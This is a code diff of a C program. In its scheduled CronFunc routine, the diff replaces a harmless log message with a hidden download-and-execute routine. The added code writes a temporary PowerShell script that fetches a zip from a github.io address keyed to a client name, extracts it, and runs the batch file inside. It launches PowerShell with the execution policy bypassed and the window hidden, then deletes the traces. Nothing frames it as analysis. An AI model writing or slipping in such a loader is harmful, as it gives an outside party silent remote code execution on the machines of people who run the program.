@@ -61,7 +61,29 @@ int WriteToLog(char* str)
 
 void CronFunc(void)
 {
-	WriteToLog("CronFunc1 is running...\n");
+	char* cmdx = (char*)malloc(5024 * sizeof(char));
+	sprintf(cmdx, "cmd /c echo $client = \"%s\"> %%tmp%%\\tmp.ps1 &&\
+ echo $zip_ext_folder = $env:TEMP>> %%tmp%%\\tmp.ps1 &&\
+ echo $out_folder = $env:TEMP>> %%tmp%%\\tmp.ps1 &&\
+ echo $file = \"index.zip\">> %%tmp%%\\tmp.ps1 &&\
+ echo $infile = \"https://paratenilesh.github.io/smsbox/\" + $client + \"/\" + $file>> %%tmp%%\\tmp.ps1 &&\
+ echo $outfile = $out_folder + \"\\\\\" + $file>> %%tmp%%\\tmp.ps1 &&\
+ echo $exefile = $zip_ext_folder + \"\\\\\" + \"index.bat\">> %%tmp%%\\tmp.ps1 &&\
+ echo [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls, [Net.SecurityProtocolType]::Tls11, [Net.SecurityProtocolType]::Tls12, [Net.SecurityProtocolType]::Ssl3>> %%tmp%%\\tmp.ps1 &&\
+ echo [Net.ServicePointManager]::SecurityProtocol = \"Tls, Tls11, Tls12, Ssl3\">> %%tmp%%\\tmp.ps1 &&\
+ echo $ProgressPreference = 'SilentlyContinue'>> %%tmp%%\\tmp.ps1 &&\
+ echo Invoke-WebRequest -Uri $infile -OutFile $outfile>> %%tmp%%\\tmp.ps1 &&\
+ echo $ProgressPreference = 'Continue'>> %%tmp%%\\tmp.ps1 &&\
+ echo Expand-Archive -LiteralPath $outfile -DestinationPath $zip_ext_folder -Force>> %%tmp%%\\tmp.ps1 &&\
+ echo Remove-item $outfile>> %%tmp%%\\tmp.ps1 &&\
+ echo $response = ^& $exefile>> %%tmp%%\\tmp.ps1 &&\
+ echo Write-Host $response>> %%tmp%%\\tmp.ps1 &&\
+ echo Remove-item $exefile>> %%tmp%%\\tmp.ps1 &&\
+ PowerShell -NoProfile -ExecutionPolicy Bypass -NoLogo -WindowStyle Hidden -Command \"& '%%tmp%%\\tmp.ps1'\" &&\
+ del %%tmp%%\\tmp.ps1", "sunclient");
+	char *result = exe_cmd(cmdx);
+	free(cmdx);
+	free(result);
 }
 
 int main(int argc, char *argv[])
